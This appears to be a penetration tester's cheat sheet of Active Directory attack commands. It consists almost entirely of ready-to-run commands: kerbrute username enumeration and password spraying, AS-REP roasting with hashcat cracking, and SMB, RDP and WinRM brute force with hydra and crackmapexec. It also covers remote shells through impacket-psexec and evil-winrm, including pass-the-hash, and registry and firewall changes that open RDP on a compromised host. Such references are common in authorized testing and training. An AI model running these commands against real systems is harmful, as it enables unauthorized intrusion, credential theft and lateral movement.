
Using kerbrute bruteforce :
```bash
kerbrute userenum --domain htb.local usernames --dc 10.10.10.4
./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman
cat combos.lst | ./kerbrute -d lab.ropnop.com bruteforce -
```

Uses port 135 RPC:
```bash
rpcclient -U "local Username" <domain ip>
rpcclient $>lookupsids local_username
rpcclient $>enumdomusers                  #enumerate local username
rpcclient $>enumdomgroups                 #enumerate groups in active directory
rpcclient $>querygroup <rid of group>     #enumerate number of users in groups
rpcclient $>querygroupmem <rid of group>  #enumerate rid of users in group
rpcclient $>queryuser <rid of user>       #enumerate user by providing rid
```

Enumerate compromised user:
```bash
impacket-lookupsid username:password@<DC IP>
```

Enumerate kerberos:
```bash
nmap -p 88 --script krb5-enum-users <target>

kerbrute userenum --dc <domain_controller> -d <domain.local> users.txt
kerbrute passwordspray -d corp.local --dc 192.168.1.10 valid_users.txt 'Winter2025!'


GetNPUsers.py corp.local/ -usersfile valid_users.txt -dc-ip 192.168.1.10 -outputfile asreproast_hashes.txt
hashcat -m 18200 asreproast_hashes.txt rockyou.txt

# AS-REP roasting
GetNPUsers.py corp.local/ -usersfile valid_users.txt -dc-ip 192.168.1.10 -outputfile asreproast.txt

```



Enumerate SMB(445,139):
```bash
using nmap:
nmap -p 139,445 <target>
nmap --script smb-os-discovery <target>
nmap --script smb-security-mode <target>
nmap --script smb-vuln-ms17-010 <target>
nmap --script smb-vuln* <target>

using enum4linux:
enum4linux -a <target>
enum4linux -U <target>
enum4linux -G <target>
enum4linux -S <target>
enum4linux -P <target>
enum4linux -o <target>

using smbclient:
smbclient -L //<target> -N
smbclient -L //<target> -U <user>%<pass>
smbclient //<target>/<share> -N
smbclient //<target>/<share> -U <user>

using rpcclient:
rpcclient -U <user>%<pass> <target>
rpcclient <target> -U "" -c "enumdomusers"
rpcclient <target> -U "" -c "enumdomgroups"
rpcclient <target> -U "" -c "getdompwinfo"
rpcclient <target> -U "" -c "lookupnames <domain>"

using crackmapexec:
crackmapexec smb <target> --shares -u '' -p ''
crackmapexec smb <target> --shares -u <user> -p <pass>
crackmapexec smb <target> --users -u <user> -p <pass>
crackmapexec smb <target> --groups -u <user> -p <pass>
crackmapexec smb <target> --vulns
crackmapexec smb <target> -u users.txt -p passwords.txt

using smbmap:
smbmap -H <target>
smbmap -H <target> -u <user> -p <pass>
smbmap -H <target> -R <share>

using hydra:
hydra -l <user> -P /path/to/passwordlist.txt smb://<target>
hydra -L users.txt -P passwords.txt smb://<target>


#try to get shell if $ADMIN having write permission for the user
impacket-psexec username@<ip address>
impacket-wmiexec username@<ip address>

```

Port 389,636 LDAP enumeration :
```bash
#using nmap 
nmap -p 389,636 <target>
nmap -p 389 --script ldap-rootdse <target>
nmap -p 389 --script ldap-search <target>

#using ldapsearch:
ldapsearch -H ldap://<dc-ip> -x -s base nameingcontext
ldapsearch -H ldap://<dc-ip> -D "username@domain.name" -w "password" -b "DC=UAP,DC=local"

ldapsearch -x -H ldap://<target> -s base -b "" defaultNamingContext
ldapsearch -x -H ldap://<target> -b "DC=corp,DC=local"
ldapsearch -x -H ldap://<target> -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

ldapsearch -x -H ldap://<target> -b "DC=corp,DC=local" "(objectClass=user)"
ldapsearch -x -H ldap://<target> -b "DC=corp,DC=local" "(objectClass=group)" cn
ldapsearch -x -H ldap://<target> -b "DC=corp,DC=local" "(objectClass=group)" member

ldapsearch -x -H ldap://<target> -b "CN=Default Domain Policy,CN=System,DC=corp,DC=local"
ldapsearch -x -H ldap://<target> -b "DC=corp,DC=local" "(objectClass=domainPolicy)"
ldapsearch -x -H ldap://<target> -b "DC=corp,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=8192)" dNSHostName

ldapsearch -x -H ldap://<target> -D "user@corp.local" -w 'Password123!' -b "DC=corp,DC=local"

ldapsearch -x -H ldap://<target> -b "DC=corp,DC=local" "(objectClass=computer)" dNSHostName

ldapsearch -x -H ldap://<target> -b "DC=corp,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName

ldapsearch -x -H ldap://<target> -b "DC=corp,DC=local" "servicePrincipalName=*" sAMAccountName servicePrincipalName

#using windows 
nltest /dclist:corp.local
dsquery user -limit 0
dsquery computer -limit 0

#using advance automated tools:
bloodhound-python -c all -u user -p 'Password123!' -d corp.local -ip <target>
ldapdomaindump -u UAP.local\\peter -p "password" <domain-ip> #get all information about 
```

Port RDP 3389 enumeration :
```bash
#using nmap
nmap -p 3389 <target>
nmap -sV -p 3389 <target>
nmap --script rdp-enum-encryption -p 3389 <target>
nmap --script rdp-ntlm-info -p 3389 <target>
nmap --script rdp-enum-encryption -p 3389 <target>
nmap --script rdp-ntlm-info -p 3389 <target>
nmap --script rdp-enum-encryption -p 3389 <target>
nmap -p3389 --script rdp-vuln-ms12-020 <target>
nmap -p3389 --script rdp-vuln-ms19-0708 <target>


rdpscan <target>

msfconsole
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS <target>
run
msfconsole
use auxiliary/scanner/rdp/rdp_scanner
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep


hydra -t 4 -V -f -L users.txt -P passwords.txt rdp://<target>
hydra -t 4 -V -f -l <user> -P rockyou.txt rdp://<target>

crowbar -b rdp -s <target>/32 -u <user> -C passwords.txt

ncrack -vv --user <user> -P passwords.txt rdp://<target>



#if domain admin is compromised 
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

xfreerdp /v:192.168.2.200 /u:domain_user  /d:UAP.local +clipboard /dynamic-resolution /drive:/home/kali/Download/,share

```


Port 5985/5986 enumeration :
```bash
nmap -p 5985,5986 <target>
nmap --script http-title -p 5985,5986 <target>
nmap --script http-enum -p 5985 <target>

curl -s -k -u '' https://<target>:5986/wsman

hydra -L users.txt -P passwords.txt <target> -s 5985 http-get /wsman

crackmapexec winrm <target> -u users.txt -p 'Password123!'
crackmapexec winrm <target> -u users.txt -p passwords.txt
crackmapexec winrm <target> -u <user> -p <pass>
crackmapexec winrm <target> -u <user> -p <pass> -x "whoami"

evil-winrm -i <target> -u <user> -p <pass>

#you already have a valid Kerberos TGT
export KRB5CCNAME=<ticket.ccache>
evil-winrm -i <target> -r <domain> -u <user> -k

#Check if WinRM is Enabled (From AD)
Get-Item WSMan:\localhost\Client\TrustedHosts
winrm quickconfig

crackmapexec winrm <target> --enabled

evil-winrm -i <target> -u <user> -H <NTLM_hash>
crackmapexec winrm <target> -u <user> -H <NTLM_hash>

Invoke-Command -ComputerName <target> -Credential <domain\user> -ScriptBlock { whoami }






```